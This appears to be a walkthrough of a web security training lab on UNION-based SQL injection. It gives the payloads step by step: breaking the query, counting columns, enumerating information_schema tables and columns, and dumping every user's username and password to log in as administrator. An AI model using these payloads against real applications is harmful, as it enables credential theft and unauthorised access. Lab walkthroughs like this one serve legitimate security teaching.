# Lab: SQL injection attack, listing the database contents on non-Oracle databases

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

***

Let's Start !!

First We Visit The Website !!

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

We Try To Inject Single Quote `'` To Break The Backend Query !!

Our Backend Query Is This Below !!

```
SELECT name,description FROM products WHERE category = 'Pets' 
```

When We Inject The Single Quote `'` Actually The Create Error In The SQL Query !!

```
SELECT name,description FROM products WHERE category = 'Pets''
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We Try To Inject `'--` To Check The Backend Query !!

Our Backend Query Is This Below !!

```
SELECT name,description FROM products WHERE category = 'Pets' 
```

When We Inject `'--` They Fix The Query and Give No Error ,In SQL `--` Refer To Comment Out In Code !!

```
SELECT name,description FROM products WHERE category = 'Pets'--'
```

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Finding Number of Columns**

**Method – ORDER BY**

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

If `ORDER BY 3` fails, query has 2 columns.

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

That `ORDER BY 3` fails, query has 2 columns.

it's Mean We assume Right Backend Query They have only Two Columns First is `name` and Second is `description` !!

```
SELECT name,description FROM products WHERE category = 'Pets'
```

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Let's We Use In Our Two Column Table !!

```
'UNION SELECT 'a','b'--
```

Our Backend Code Look's Like This After Injecting This Query !!

```
SELECT name,description FROM products WHERE category = 'Pets'
UNION
SELECT 'a','b'
```

Then See If Our First and Second Both Column is String They Return No Error !!

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use the following payload to display the database version:

```
'UNION SELECT version(),'b'--
```

<figure><img src="../../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use the following payload to retrieve the list of tables in the database:

```
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

<figure><img src="../../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use the following payload (replacing the table name) to retrieve the details of the columns in the table:

```
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_pferxc'--
```

<figure><img src="../../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:

```
' UNION SELECT username_govtqv,password_hcvbes FROM users_pferxc--
```

<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

Find the password for the `administrator` user, and use it to log in.

<figure><img src="../../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
